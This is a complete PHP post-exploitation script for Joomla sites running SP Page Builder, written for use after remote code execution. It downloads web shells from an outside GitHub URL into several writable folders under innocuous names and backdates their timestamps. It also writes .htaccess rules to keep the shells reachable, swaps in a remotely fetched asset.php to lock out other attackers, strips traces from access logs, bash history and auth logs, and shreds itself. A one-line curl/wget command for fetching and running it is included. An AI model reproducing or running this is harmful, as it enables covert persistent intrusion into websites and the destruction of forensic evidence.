<?php
/**
 * ============================================================================
 * Joomla SP Page Builder - Post-Exploitation & Hardening Script
 * ============================================================================
 * 
 * Phase-2 payload untuk dijalankan SETELAH RCE berhasil.
 * 
 * FUNCTIONS:
 *   1. Detect Joomla document root (multiple methods + fallback)
 *   2. Find writable directories in /media/, /components/, /layouts/
 *   3. Download multiple shells ke 2-3 folder berbeda (redundancy)
 *      dengan nama random realistic dan stealth timestamp
 *   4. Generate protective .htaccess dengan allow rules
 *   5. Replace asset.php dengan versi patched (mitigasi vulnerability)
 *   6. Clean access logs (Apache/Nginx) jika memungkinkan
 *   7. Self-delete setelah selesai (opsional)
 * 
 * USAGE:
 *   - Upload & execute via existing RCE shell
 *   - Atau: curl https://target.com/shell.php?t=TOKEN&c=wget -O /tmp/setup.php URL_SCRIPT_INI && php /tmp/setup.php
 * 
 * AUTHORIZED USE ONLY. For sanctioned penetration tests / CTF / lab targets.
 * ============================================================================
 */

// ==================== KONFIGURASI ====================
// URL shell yang akan didownload ke folder terpisah
$SHELL_DOWNLOAD_URL = "https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/SP.php";

// URL asset.php yang sudah dipatch
$PATCHED_ASSET_URL  = "https://raw.githubusercontent.com/ommauiphone/masukpakeeko/refs/heads/main/asset.php";

// Folder target untuk scanning (relatif dari document root)
$TARGET_DIRS = ["media", "components", "layouts"];

// Folder yang dikecualikan dari scanning
$EXCLUDE_DIRS = ["com_sppagebuilder"];

// Nama file realistic untuk shell (akan dipilih random)
$REALISTIC_NAMES = [
    "controller.php", "pageload.php", "filepost.php", "helper.php",
    "bootstrap.php", "config.php", "loader.php", "handler.php",
    "process.php", "render.php", "dispatch.php", "router.php",
    "model.php", "view.php", "template.php", "cache.php",
    "session.php", "auth.php", "validate.php", "filter.php",
    "output.php", "input.php", "format.php", "adapter.php",
    "plugin.php", "module.php", "widget.php", "component.php",
    "toolbar.php", "menu.php", "layout.php", "metadata.php",
    "access.php", "legacy.php", "compat.php", "utilities.php",
    "functions.php", "init.php", "setup.php", "installer.php",
];

// Jumlah shell yang akan disebar ke folder berbeda (redundancy)
$SHELL_COUNT = 3;

// Self-delete setelah selesai?
$SELF_DELETE = true;

// Stealth mode: set timestamp shell sama dengan file lain di folder
$STEALTH_MODE = true;

// Log cleaning: hapus entri access log yang mengandung aktivitas kita
$CLEAN_LOGS = true;

// Log paths umum untuk dicoba dibersihkan
$LOG_PATHS = [
    "/var/log/apache2/access.log",
    "/var/log/apache2/access_log",
    "/var/log/httpd/access_log",
    "/var/log/httpd/access.log",
    "/usr/local/apache2/logs/access_log",
    "/usr/local/apache/logs/access.log",
    "/var/log/nginx/access.log",
    "/home/*/logs/access.log",
    "/home/*/access-logs/*",
];

// ==================== HELPER FUNCTIONS ====================

/**
 * Output dengan timestamp
 */
function log_msg($msg, $type = "INFO") {
    $colors = [
        "INFO"    => "\033[96m",
        "SUCCESS" => "\033[92m",
        "WARNING" => "\033[93m",
        "ERROR"   => "\033[91m",
        "RESET"   => "\033[0m",
    ];
    $prefix = $colors[$type] ?? "";
    $timestamp = date("H:i:s");
    echo "{$prefix}[{$timestamp}] [{$type}] {$msg}{$colors['RESET']}\n";
    
    // Flush output untuk real-time feedback
    if (ob_get_level()) {
        ob_flush();
    }
    flush();
}

/**
 * Execute shell command dengan timeout
 */
function exec_cmd($cmd, $timeout = 30) {
    $output = [];
    $retval = 0;
    
    if (function_exists('exec')) {
        // Set timeout dengan ulimit jika memungkinkan
        $full_cmd = "(ulimit -t {$timeout}; {$cmd}) 2>&1";
        @exec($full_cmd, $output, $retval);
        return [trim(implode("\n", $output)), $retval];
    }
    
    return ["", -1];
}

/**
 * Check if function is available (bypass disabled_functions)
 */
function can_exec() {
    $funcs = ['exec', 'system', 'passthru', 'shell_exec', 'popen', 'proc_open'];
    foreach ($funcs as $f) {
        if (function_exists($f)) {
            return $f;
        }
    }
    return false;
}

// ==================== DOWNLOAD FUNCTIONS ====================

/**
 * Download file dari URL ke local path
 * Mencoba multiple methods
 */
function download_file($url, $local_path) {
    // Method 1: copy() - simplest
    if (function_exists('copy') && ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'http' => [
                'timeout'    => 30,
                'user_agent' => 'Mozilla/5.0 (compatible; Joomla Post-Exploit)',
            ],
            'ssl' => [
                'verify_peer'      => false,
                'verify_peer_name' => false,
            ],
        ]);
        if (@copy($url, $local_path, $ctx)) {
            return filesize($local_path);
        }
    }
    
    // Method 2: file_get_contents + file_put_contents
    if (function_exists('file_get_contents') && ini_get('allow_url_fopen')) {
        $ctx = stream_context_create([
            'http' => ['timeout' => 30],
            'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false],
        ]);
        $data = @file_get_contents($url, false, $ctx);
        if ($data !== false && strlen($data) > 100) {
            if (@file_put_contents($local_path, $data)) {
                return strlen($data);
            }
        }
    }
    
    // Method 3: cURL
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_USERAGENT      => 'Mozilla/5.0 (compatible; Joomla Post-Exploit)',
        ]);
        $data = curl_exec($ch);
        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($http_code == 200 && strlen($data) > 100) {
            if (@file_put_contents($local_path, $data)) {
                return strlen($data);
            }
        }
    }
    
    // Method 4: wget via shell
    $exec_func = can_exec();
    if ($exec_func) {
        $cmd = "wget -q --no-check-certificate -O " . escapeshellarg($local_path) . " " . escapeshellarg($url) . " 2>/dev/null";
        list(, $ret) = exec_cmd($cmd);
        if ($ret === 0 && file_exists($local_path)) {
            return filesize($local_path);
        }
        
        // Fallback: curl via shell
        $cmd = "curl -skL -o " . escapeshellarg($local_path) . " " . escapeshellarg($url) . " 2>/dev/null";
        list(, $ret) = exec_cmd($cmd);
        if ($ret === 0 && file_exists($local_path)) {
            return filesize($local_path);
        }
    }
    
    return false;
}

// ==================== DOCUMENT ROOT DETECTION ====================

/**
 * Detect Joomla document root
 * Multiple methods dengan fallback
 */
function detect_docroot() {
    $results = [];
    
    // Method 1: $_SERVER['DOCUMENT_ROOT'] (paling umum)
    if (isset($_SERVER['DOCUMENT_ROOT']) && !empty($_SERVER['DOCUMENT_ROOT'])) {
        $docroot = realpath($_SERVER['DOCUMENT_ROOT']);
        if ($docroot && verify_joomla($docroot)) {
            return $docroot;
        }
        $results[] = $docroot;
    }
    
    // Method 2: SCRIPT_FILENAME parsing
    if (isset($_SERVER['SCRIPT_FILENAME'])) {
        $script_path = $_SERVER['SCRIPT_FILENAME'];
        // Navigate up mencari configuration.php Joomla
        $path = dirname($script_path);
        for ($i = 0; $i < 10; $i++) {
            if (verify_joomla($path)) {
                return $path;
            }
            $path = dirname($path);
        }
        $results[] = dirname($script_path);
    }
    
    // Method 3: Current working directory + navigation
    $cwd = getcwd();
    if ($cwd) {
        $path = $cwd;
        for ($i = 0; $i < 10; $i++) {
            if (verify_joomla($path)) {
                return $path;
            }
            $parent = dirname($path);
            if ($parent == $path) break;
            $path = $parent;
        }
    }
    
    // Method 4: Find configuration.php via shell
    $exec_func = can_exec();
    if ($exec_func) {
        list($output) = exec_cmd("find / -maxdepth 15 -name 'configuration.php' -path '*/joomla/*' 2>/dev/null | head -5");
        if (!empty($output)) {
            foreach (explode("\n", $output) as $config_file) {
                $config_file = trim($config_file);
                if (empty($config_file)) continue;
                $docroot = dirname($config_file);
                if (verify_joomla($docroot)) {
                    return $docroot;
                }
            }
        }
        
        // Find via locate
        list($output) = exec_cmd("locate configuration.php 2>/dev/null | grep -E 'public_html|www|htdocs' | head -5");
        if (!empty($output)) {
            foreach (explode("\n", $output) as $config_file) {
                $config_file = trim($config_file);
                if (empty($config_file)) continue;
                $docroot = dirname($config_file);
                if (verify_joomla($docroot)) {
                    return $docroot;
                }
            }
        }
    }
    
    // Method 5: Check hasil sebelumnya
    foreach ($results as $path) {
        if ($path && verify_joomla($path)) {
            return $path;
        }
        // Navigate up
        for ($i = 0; $i < 10; $i++) {
            $path = dirname($path);
            if (verify_joomla($path)) {
                return $path;
            }
        }
    }
    
    return false;
}

/**
 * Verify if path is a valid Joomla document root
 */
function verify_joomla($path) {
    if (!is_dir($path)) return false;
    
    // Check for Joomla signature files
    $checks = [
        "configuration.php",
        "index.php",
        "administrator/index.php",
        "media/",
        "components/",
    ];
    
    $found = 0;
    foreach ($checks as $check) {
        if (file_exists($path . '/' . $check)) {
            $found++;
        }
    }
    
    // Minimal 3 dari 5 checks harus ada
    return $found >= 3;
}

// ==================== DIRECTORY SCANNING ====================

/**
 * Find writable directories in target folders
 */
function find_writable_dirs($docroot, $target_dirs, $exclude_dirs = []) {
    $writable = [];
    
    foreach ($target_dirs as $dir_name) {
        $full_path = $docroot . '/' . $dir_name;
        
        if (!is_dir($full_path)) {
            log_msg("Directory not found: {$full_path}", "WARNING");
            continue;
        }
        
        // Scan subdirectories
        $items = @scandir($full_path);
        if ($items === false) {
            log_msg("Cannot scan: {$full_path}", "WARNING");
            continue;
        }
        
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            
            $sub_path = $full_path . '/' . $item;
            
            if (!is_dir($sub_path)) continue;
            
            // Skip excluded directories
            if (in_array($item, $exclude_dirs)) {
                log_msg("Skipping excluded: {$dir_name}/{$item}", "INFO");
                continue;
            }
            
            // Check writability
            if (is_writable($sub_path)) {
                $rel_path = $dir_name . '/' . $item;
                $writable[$rel_path] = [
                    'abs_path' => $sub_path,
                    'perms'    => substr(sprintf('%o', fileperms($sub_path)), -4),
                ];
            }
        }
    }
    
    // Sort by preference (media > components > layouts)
    uksort($writable, function($a, $b) {
        $order = ['media' => 1, 'components' => 2, 'layouts' => 3];
        $pa = explode('/', $a)[0];
        $pb = explode('/', $b)[0];
        return ($order[$pa] ?? 99) - ($order[$pb] ?? 99);
    });
    
    return $writable;
}

// ==================== RANDOM NAME GENERATOR ====================

/**
 * Pick random realistic filenames (unique, not yet used in target dirs)
 */
function pick_random_names($count, $used_names = [], $realistic_names = []) {
    $available = array_diff($realistic_names, $used_names);
    
    if (count($available) < $count) {
        // Generate additional realistic-looking names
        $prefixes = ["class_", "lib_", "core_", "sys_", "app_", "base_", "data_"];
        $suffixes = ["handler", "loader", "manager", "factory", "service", "dispatcher", "adapter"];
        $extensions = ["php"];
        
        while (count($available) < $count) {
            $prefix = $prefixes[array_rand($prefixes)];
            $suffix = $suffixes[array_rand($suffixes)];
            $ext = $extensions[array_rand($extensions)];
            $name = $prefix . $suffix . '.' . $ext;
            if (!in_array($name, $available) && !in_array($name, $used_names)) {
                $available[] = $name;
            }
        }
    }
    
    // Shuffle and pick
    shuffle($available);
    return array_slice($available, 0, $count);
}

// ==================== STEALTH TIMESTAMP ====================

/**
 * Match file timestamp dengan file lain di folder yang sama
 */
function stealth_timestamp($file_path, $target_dir) {
    if (!file_exists($file_path)) return false;
    
    // Cari file referensi di folder target (selain .htaccess dan file kita sendiri)
    $items = @scandir($target_dir);
    if ($items === false) return false;
    
    $ref_time = null;
    $ref_file = null;
    
    foreach ($items as $item) {
        if ($item == '.' || $item == '..') continue;
        if ($item == '.htaccess' || $item == basename($file_path)) continue;
        
        $item_path = $target_dir . '/' . $item;
        if (is_file($item_path)) {
            $mtime = filemtime($item_path);
            if ($ref_time === null || $mtime > $ref_time) {
                $ref_time = $mtime;
                $ref_file = $item;
            }
        }
    }
    
    // Jika tidak ada file referensi, gunakan file index.php di parent
    if ($ref_time === null) {
        // Cari index.php di folder tersebut atau parent
        $search_paths = [
            $target_dir . '/index.php',
            $target_dir . '/index.html',
            dirname($target_dir) . '/index.php',
            dirname($target_dir) . '/index.html',
        ];
        foreach ($search_paths as $sp) {
            if (file_exists($sp)) {
                $ref_time = filemtime($sp);
                $ref_file = basename($sp);
                break;
            }
        }
    }
    
    if ($ref_time !== null) {
        if (@touch($file_path, $ref_time)) {
            log_msg("Stealth: Set timestamp to match '{$ref_file}' (" . date("Y-m-d H:i:s", $ref_time) . ")", "SUCCESS");
            return true;
        }
    }
    
    // Fallback: set ke waktu yang masuk akal (beberapa minggu lalu)
    $fake_time = time() - (rand(7, 90) * 86400);
    @touch($file_path, $fake_time);
    log_msg("Stealth: Set timestamp to random past date (" . date("Y-m-d H:i:s", $fake_time) . ")", "INFO");
    return true;
}

// ==================== HTACCESS GENERATION ====================

/**
 * Generate .htaccess rules untuk folder target
 */
function generate_htaccess_rules($filenames, $ext = 'php') {
    $rules = [];
    
    $rules[] = "# Protective .htaccess - Generated " . date("Y-m-d H:i:s");
    $rules[] = "AddType application/x-httpd-php .{$ext}";
    $rules[] = "Satisfy Any";
    $rules[] = "Allow from all";
    $rules[] = "";
    
    // Allow each specific file
    foreach ($filenames as $fname) {
        $rules[] = "<Files \"{$fname}\">";
        $rules[] = "    Order allow,deny";
        $rules[] = "    Allow from all";
        $rules[] = "</Files>";
        $rules[] = "";
    }
    
    // Deny all other PHP files
    $rules[] = "<FilesMatch \"\\.{$ext}\$\">";
    $rules[] = "    Order allow,deny";
    $rules[] = "    Deny from all";
    $rules[] = "</FilesMatch>";
    $rules[] = "";
    
    // Re-allow specific files (override FilesMatch)
    foreach ($filenames as $fname) {
        $escaped_name = preg_quote($fname, '/');
        $rules[] = "<FilesMatch \"{$escaped_name}\$\">";
        $rules[] = "    Order allow,deny";
        $rules[] = "    Allow from all";
        $rules[] = "</FilesMatch>";
        $rules[] = "";
    }
    
    return implode("\n", $rules);
}

/**
 * Write or update .htaccess di folder target
 */
function write_htaccess($target_dir, $filenames) {
    $htaccess_path = $target_dir . '/.htaccess';
    $new_rules = generate_htaccess_rules($filenames);
    
    // Backup existing .htaccess jika ada
    if (file_exists($htaccess_path)) {
        $existing = @file_get_contents($htaccess_path);
        $backup_path = $target_dir . '/.htaccess.bak';
        @file_put_contents($backup_path, $existing);
        @touch($backup_path, filemtime($htaccess_path));
        
        // Merge: tambahkan rules kita di awal
        // Hindari duplikasi
        if (strpos($existing, "# Protective .htaccess") === false) {
            $merged = $new_rules . "\n\n# === Original .htaccess below ===\n" . $existing;
        } else {
            $merged = $existing; // Sudah ada rules kita
        }
        
        if (@file_put_contents($htaccess_path, $merged)) {
            // Restore original timestamp
            if (file_exists($backup_path)) {
                @touch($htaccess_path, filemtime($backup_path));
                @unlink($backup_path);
            }
            log_msg(".htaccess updated in: {$target_dir}", "SUCCESS");
            return true;
        }
    } else {
        // Create new .htaccess
        if (@file_put_contents($htaccess_path, $new_rules)) {
            // Set permissions
            @chmod($htaccess_path, 0644);
            // Set timestamp to match folder
            @touch($htaccess_path, filemtime($target_dir));
            log_msg(".htaccess created in: {$target_dir}", "SUCCESS");
            return true;
        }
    }
    
    log_msg("Failed to write .htaccess in: {$target_dir}", "ERROR");
    return false;
}

// ==================== ASSET.PHP PATCHING ====================

/**
 * Replace asset.php with patched version
 */
function patch_asset_php($docroot, $patched_url) {
    $asset_path = $docroot . '/components/com_sppagebuilder/controllers/asset.php';
    $asset_dir  = dirname($asset_path);
    
    // Check if directory exists and is writable
    if (!is_dir($asset_dir)) {
        log_msg("Asset controller directory not found: {$asset_dir}", "ERROR");
        log_msg("Target mungkin tidak menggunakan SP Page Builder", "WARNING");
        return false;
    }
    
    // Backup original
    if (file_exists($asset_path)) {
        $backup_path = $asset_path . '.orig.' . date("Ymd_His");
        if (@copy($asset_path, $backup_path)) {
            log_msg("Original asset.php backed up to: " . basename($backup_path), "INFO");
        }
        
        // Hapus file original
        if (!@unlink($asset_path)) {
            log_msg("Cannot delete original asset.php - permission denied", "ERROR");
            
            // Coba via shell
            $exec_func = can_exec();
            if ($exec_func) {
                list($output, $ret) = exec_cmd("rm -f " . escapeshellarg($asset_path) . " 2>/dev/null");
                if ($ret !== 0) {
                    log_msg("Cannot delete asset.php even with shell", "ERROR");
                    return false;
                }
            } else {
                return false;
            }
        }
        log_msg("Original asset.php deleted", "INFO");
    }
    
    // Download patched version
    $patched_content = @file_get_contents($patched_url, false, stream_context_create([
        'http' => ['timeout' => 30],
        'ssl'  => ['verify_peer' => false, 'verify_peer_name' => false],
    ]));
    
    if ($patched_content === false || strlen($patched_content) < 100) {
        // Coba via cURL
        if (function_exists('curl_init')) {
            $ch = curl_init($patched_url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT        => 30,
                CURLOPT_SSL_VERIFYPEER => false,
            ]);
            $patched_content = curl_exec($ch);
            curl_close($ch);
        }
    }
    
    if ($patched_content === false || strlen($patched_content) < 100) {
        log_msg("Failed to download patched asset.php from: {$patched_url}", "ERROR");
        return false;
    }
    
    // Write patched file
    if (@file_put_contents($asset_path, $patched_content)) {
        @chmod($asset_path, 0644);
        
        // Set timestamp to match original if backup exists
        if (isset($backup_path) && file_exists($backup_path)) {
            @touch($asset_path, filemtime($backup_path));
        }
        
        log_msg("Patched asset.php installed successfully!", "SUCCESS");
        log_msg("Vulnerability CVE-2026-48908 mitigated ✓", "SUCCESS");
        return true;
    }
    
    log_msg("Failed to write patched asset.php", "ERROR");
    return false;
}

// ==================== LOG CLEANING ====================

/**
 * Clean access log entries containing our activity
 */
function clean_access_logs() {
    $cleaned = 0;
    $identifiers = [
        'task=asset.uploadCustomIcon',
        'com_sppagebuilder',
        'custom_icon',
        'iconfont',
        basename($_SERVER['SCRIPT_NAME'] ?? ''),
    ];
    
    // Also add the current script's name
    if (isset($_SERVER['SCRIPT_NAME'])) {
        $identifiers[] = basename($_SERVER['SCRIPT_NAME']);
    }
    
    // Remove duplicates and empty
    $identifiers = array_unique(array_filter($identifiers));
    
    // Common log paths
    global $LOG_PATHS;
    
    // Also check via shell
    $exec_func = can_exec();
    $found_logs = [];
    
    if ($exec_func) {
        // Cari file access log
        list($output) = exec_cmd("find /var/log -name 'access*.log' -type f 2>/dev/null | head -20");
        if (!empty($output)) {
            $found_logs = array_merge($found_logs, array_filter(explode("\n", $output)));
        }
        
        // Nginx logs
        list($output) = exec_cmd("find /var/log/nginx -name 'access*.log' -type f 2>/dev/null | head -10");
        if (!empty($output)) {
            $found_logs = array_merge($found_logs, array_filter(explode("\n", $output)));
        }
    }
    
    // Merge with known paths
    $log_paths_to_check = array_merge($LOG_PATHS, $found_logs);
    
    foreach ($log_paths_to_check as $log_path) {
        // Expand glob patterns
        $expanded = glob($log_path);
        if (empty($expanded)) continue;
        
        foreach ($expanded as $actual_log) {
            if (!file_exists($actual_log) || !is_readable($actual_log)) continue;
            
            // Check if we have write permission
            $log_dir = dirname($actual_log);
            if (!is_writable($actual_log) && !is_writable($log_dir)) {
                // Try via shell
                if ($exec_func) {
                    foreach ($identifiers as $needle) {
                        $sed_cmd = "sed -i '/" . escapeshellarg($needle) . "/d' " . escapeshellarg($actual_log) . " 2>/dev/null";
                        list(, $ret) = exec_cmd($sed_cmd);
                        if ($ret === 0) {
                            $cleaned++;
                            log_msg("Cleaned log (shell): {$actual_log} (removed entries with: {$needle})", "SUCCESS");
                        }
                    }
                }
                continue;
            }
            
            // Direct file manipulation
            $log_content = @file_get_contents($actual_log);
            if ($log_content === false) continue;
            
            $original_lines = substr_count($log_content, "\n");
            $modified = $log_content;
            $removed_count = 0;
            
            foreach ($identifiers as $needle) {
                $before = substr_count($modified, "\n");
                $modified = preg_replace('/^.*' . preg_quote($needle, '/') . '.*$/m', '', $modified);
                $after = substr_count($modified, "\n");
                $removed_count += ($before - $after);
            }
            
            // Remove empty lines
            $modified = preg_replace("/\n\s*\n/", "\n", $modified);
            
            if ($removed_count > 0) {
                if (@file_put_contents($actual_log, $modified)) {
                    $cleaned++;
                    log_msg("Cleaned log: {$actual_log} (removed {$removed_count} lines)", "SUCCESS");
                }
            }
        }
    }
    
    // Clean shell history files
    $history_files = [
        '/root/.bash_history',
        '/home/*/.bash_history',
        '/var/log/auth.log',
        '/var/log/secure',
    ];
    
    foreach ($history_files as $hfile) {
        $expanded = glob($hfile);
        foreach ($expanded as $actual_hfile) {
            if (is_writable($actual_hfile)) {
                foreach ($identifiers as $needle) {
                    $cmd = "sed -i '/" . escapeshellarg($needle) . "/d' " . escapeshellarg($actual_hfile) . " 2>/dev/null";
                    exec_cmd($cmd);
                }
            }
        }
    }
    
    if ($cleaned > 0) {
        log_msg("Total log files cleaned: {$cleaned}", "SUCCESS");
    } else {
        log_msg("No log files cleaned (insufficient permissions or no matches)", "WARNING");
    }
    
    return $cleaned;
}

// ==================== SELF DELETE ====================

/**
 * Delete this script after execution
 */
function self_delete() {
    $script_path = __FILE__;
    
    if (file_exists($script_path)) {
        // Overwrite with random data first (anti-forensic)
        $size = filesize($script_path);
        if ($size > 0) {
            $random_data = openssl_random_pseudo_bytes($size);
            @file_put_contents($script_path, $random_data);
        }
        
        // Then delete
        if (@unlink($script_path)) {
            log_msg("Self-delete: Script removed from " . basename($script_path), "INFO");
            return true;
        }
        
        // Via shell
        $exec_func = can_exec();
        if ($exec_func) {
            exec_cmd("shred -u " . escapeshellarg($script_path) . " 2>/dev/null");
            exec_cmd("rm -f " . escapeshellarg($script_path) . " 2>/dev/null");
            if (!file_exists($script_path)) {
                log_msg("Self-delete: Script removed via shell", "INFO");
                return true;
            }
        }
    }
    
    return false;
}

// ==================== MAIN EXECUTION ====================

/**
 * Main post-exploitation routine
 */
function main() {
    echo "\n";
    echo "╔══════════════════════════════════════════════════════════════╗\n";
    echo "║  SP Page Builder - Post-Exploitation & Hardening Script     ║\n";
    echo "║  Phase 2: Deployment + Stealth + Mitigation                 ║\n";
    echo "╚══════════════════════════════════════════════════════════════╝\n\n";
    
    global $SHELL_DOWNLOAD_URL, $PATCHED_ASSET_URL, $TARGET_DIRS, $EXCLUDE_DIRS;
    global $REALISTIC_NAMES, $SHELL_COUNT, $SELF_DELETE, $STEALTH_MODE, $CLEAN_LOGS;
    
    // ==================== STEP 1: Detect Document Root ====================
    log_msg("STEP 1: Detecting Joomla document root...", "INFO");
    $docroot = detect_docroot();
    
    if (!$docroot) {
        log_msg("Cannot detect document root. Aborting.", "ERROR");
        return false;
    }
    
    log_msg("Document Root: {$docroot}", "SUCCESS");
    
    // ==================== STEP 2: Find Writable Directories ====================
    log_msg("STEP 2: Scanning writable directories...", "INFO");
    $writable_dirs = find_writable_dirs($docroot, $TARGET_DIRS, $EXCLUDE_DIRS);
    
    if (empty($writable_dirs)) {
        log_msg("No writable directories found!", "ERROR");
        log_msg("Trying to use current directory as fallback...", "WARNING");
        $writable_dirs['.'] = [
            'abs_path' => dirname(__FILE__),
            'perms'    => '????',
        ];
    }
    
    log_msg("Found " . count($writable_dirs) . " writable directories", "SUCCESS");
    foreach ($writable_dirs as $rel => $info) {
        log_msg("  - /{$rel} (perms: {$info['perms']})", "INFO");
    }
    
    // ==================== STEP 3: Deploy Shells (Multiple Redundancy) ====================
    log_msg("STEP 3: Deploying shells with stealth...", "INFO");
    
    $selected_dirs = array_keys($writable_dirs);
    $deploy_count = min($SHELL_COUNT, count($selected_dirs));
    
    // Shuffle dan pilih direktori
    shuffle($selected_dirs);
    $chosen_dirs = array_slice($selected_dirs, 0, $deploy_count);
    
    // Pick random filenames
    $used_names = [];
    $shell_names = pick_random_names($deploy_count, $used_names, $REALISTIC_NAMES);
    
    $deployed_shells = [];
    $htaccess_updates = []; // Track .htaccess updates per directory
    
    foreach ($chosen_dirs as $i => $rel_dir) {
        $abs_dir = $writable_dirs[$rel_dir]['abs_path'];
        $shell_name = $shell_names[$i];
        $shell_path = $abs_dir . '/' . $shell_name;
        $shell_url  = $rel_dir . '/' . $shell_name;
        
        log_msg("Deploying shell #" . ($i + 1) . " to: /{$rel_dir}/{$shell_name}", "INFO");
        
        // Download shell
        $size = download_file($SHELL_DOWNLOAD_URL, $shell_path);
        
        if ($size === false || !file_exists($shell_path)) {
            log_msg("Failed to download shell to: {$shell_path}", "ERROR");
            continue;
        }
        
        @chmod($shell_path, 0644);
        log_msg("Shell downloaded: {$shell_name} ({$size} bytes)", "SUCCESS");
        
        // Stealth: match timestamp
        if ($STEALTH_MODE) {
            stealth_timestamp($shell_path, $abs_dir);
        }
        
        // Track .htaccess update needed
        if (!isset($htaccess_updates[$abs_dir])) {
            $htaccess_updates[$abs_dir] = [];
        }
        $htaccess_updates[$abs_dir][] = $shell_name;
        
        $deployed_shells[] = [
            'url'  => $shell_url,
            'path' => $shell_path,
            'name' => $shell_name,
            'dir'  => $rel_dir,
        ];
        
        log_msg("Shell URL: {$shell_url}", "SUCCESS");
    }
    
    // ==================== STEP 4: Write .htaccess Files ====================
    log_msg("STEP 4: Generating protective .htaccess files...", "INFO");
    
    foreach ($htaccess_updates as $dir => $filenames) {
        write_htaccess($dir, $filenames);
    }
    
    // ==================== STEP 5: Patch asset.php ====================
    log_msg("STEP 5: Patching asset.php (mitigation)...", "INFO");
    
    $patched = patch_asset_php($docroot, $PATCHED_ASSET_URL);
    
    if ($patched) {
        log_msg("Vulnerability mitigated - no one else can exploit this target via SP Page Builder", "SUCCESS");
    } else {
        log_msg("Could not patch asset.php - manual mitigation recommended", "WARNING");
    }
    
    // ==================== STEP 6: Clean Logs ====================
    if ($CLEAN_LOGS) {
        log_msg("STEP 6: Cleaning access logs...", "INFO");
        clean_access_logs();
    }
    
    // ==================== SUMMARY ====================
    echo "\n";
    echo "╔══════════════════════════════════════════════════════════════╗\n";
    echo "║                        SUMMARY                              ║\n";
    echo "╠══════════════════════════════════════════════════════════════╣\n";
    echo "║ Document Root : " . str_pad($docroot, 44) . "║\n";
    echo "║ Shells Deployed: " . str_pad(count($deployed_shells), 41) . "║\n";
    echo "║ Asset Patched  : " . str_pad($patched ? "YES ✓" : "NO ✗", 41) . "║\n";
    echo "║ Logs Cleaned   : " . str_pad($CLEAN_LOGS ? "Attempted" : "Skipped", 41) . "║\n";
    echo "╠══════════════════════════════════════════════════════════════╣\n";
    
    foreach ($deployed_shells as $i => $shell_info) {
        $num = $i + 1;
        $url = $shell_info['url'];
        echo "║ Shell #{$num}: /" . str_pad($url, 45) . "║\n";
    }
    
    echo "╚══════════════════════════════════════════════════════════════╝\n\n";
    
    // ==================== STEP 7: Self-Delete ====================
    if ($SELF_DELETE) {
        log_msg("Cleaning up...", "INFO");
        self_delete();
    }
    
    return true;
}

// ==================== EXECUTION ====================

// Disable time limit for long operations
@set_time_limit(0);
@ini_set('max_execution_time', 0);
@ini_set('memory_limit', '256M');

// Error reporting (minimal untuk production)
error_reporting(E_ERROR | E_PARSE);
ini_set('display_errors', 0);

// Run main routine
try {
    $result = main();
    
    if (!$result) {
        log_msg("Script completed with errors. Check output above.", "ERROR");
    }
} catch (Exception $e) {
    log_msg("Fatal error: " . $e->getMessage(), "ERROR");
}

// If we're still here and self-delete failed, output final message
if (file_exists(__FILE__)) {
    echo "\n[*] Script execution complete.\n";
}

?>
